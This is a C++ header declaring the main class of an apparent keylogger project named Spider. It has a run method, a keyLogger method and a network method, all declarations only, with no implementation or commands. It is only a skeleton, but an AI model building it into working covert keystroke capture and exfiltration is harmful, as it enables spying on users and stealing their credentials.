//!
//! \file Spider.hpp
//! \author jbruel
//! \date 30/09/2017
//!

#ifndef SPIDER_SPIDER_HPP
#define SPIDER_SPIDER_HPP

#include "Event/EventQueue.hpp"

//!
//! \namespace Spider
//!
namespace Spider
{
//!
//! \namespace Core
//!
namespace Core
{
	//!
	//! \class Spider
	//! \brief Project main class
	//!
	class Spider
	{
	public:
		//!
		//! \brief Default Spider class constructor
		//!
		Spider();
		//!
		//! \brief Default Spider copy class constructor
		//!
		Spider(const Spider &) = delete;
		//!
		//! \brief Spider operator equal overload
		//!
		Spider	&operator=(const Spider &) const = delete;
		//!
		//! \brief Default Spider class destructor
		//!
		~Spider() = default;

	public:
		//!
		//! \brief run the Spider capacity
		//!
		void	run(int argc, const char *const *argv);

	private:
		//!
		//! \brief Handle the keylogger capacity
		//! \param queue The Event Queue system
		//!
		static void	keyLogger(Event::EventQueue *queue);
		//!
		//! \brief Handle the network capacity
		//! \param queue The event queue system
		//!
		static void network(Event::EventQueue *queue, int argc, const char *const *argv);
	};
}
}

#endif //SPIDER_SPIDER_HPP
